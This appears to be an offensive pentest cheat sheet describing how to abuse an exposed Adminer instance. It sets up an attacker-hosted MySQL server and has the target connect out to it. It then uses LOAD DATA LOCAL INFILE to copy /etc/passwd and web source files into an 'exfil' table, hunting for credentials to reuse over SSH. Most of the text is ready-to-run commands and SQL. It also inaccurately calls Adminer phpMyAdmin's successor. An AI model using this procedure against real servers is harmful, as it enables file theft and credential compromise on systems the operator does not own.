# Adminer LOAD DATA LOCAL INFILE File Read

Adminer (database management web app, successor to phpMyAdmin) allows connecting to remote databases. If an attacker hosts a MySQL server accessible from the target, they can make the target's Adminer connect out and use `LOAD DATA LOCAL INFILE` to read local files from the target server.

## Setup Attacker MySQL Server

```bash
# 1. Edit /etc/mysql/mariadb.conf.d/50-server.cnf — bind to attacker IP
#    bind-address = <LHOST>

# 2. Create exfil database and table
mysql -u root -p
CREATE DATABASE pwn;
USE pwn;
CREATE TABLE exfil (data VARCHAR(4096));

# 3. Grant access from target IP
GRANT ALL PRIVILEGES ON *.* TO 'root'@'<TARGET_IP>' IDENTIFIED BY 'password' WITH GRANT OPTION;
FLUSH PRIVILEGES;

# 4. Start MySQL
service mysql start
```

## Connect via Adminer

```
# In Adminer (http://<TARGET>/adminer.php or /utility-scripts/adminer.php):
Server: <LHOST>
Username: root
Password: password
Database: pwn
```

## Read Target Files

```sql
-- In Adminer's SQL command box:
LOAD DATA LOCAL INFILE '/etc/passwd'
INTO TABLE pwn.exfil
FIELDS TERMINATED BY '\n';

-- Read web app source for credentials
LOAD DATA LOCAL INFILE '/var/www/html/index.php'
INTO TABLE pwn.exfil
FIELDS TERMINATED BY '\n';

-- View results
SELECT * FROM pwn.exfil;
```

## Notes
- Requires Adminer accessible on the target and MySQL reachable from target to attacker
- `LOCAL` keyword reads files from the Adminer server (the target), not the DB server
- Useful to read live config files that differ from backed-up versions
- Adminer path often: `/adminer.php`, `/utility-scripts/adminer.php`, `/admin/adminer.php`
- Credentials found in source may work for SSH or other services
